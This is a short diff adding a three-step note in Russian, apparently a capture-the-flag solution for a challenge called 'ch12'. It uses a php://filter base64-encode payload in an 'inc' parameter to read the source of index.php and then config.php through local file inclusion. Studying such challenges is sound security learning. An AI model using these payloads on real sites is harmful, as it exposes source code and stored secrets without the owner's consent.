@@ -1,0 +1,3 @@
+1. ?inc=php://filter/convert.base64-encode/resource=index.php применяем к странице index.php фильтр, и получаем ее код в base64
+2. Изучаем код. Видим, что он подключает файл config.php
+3. Вытягиваем и изучаем его. ch12/?inc=php://filter/convert.base64-encode/resource=config.php
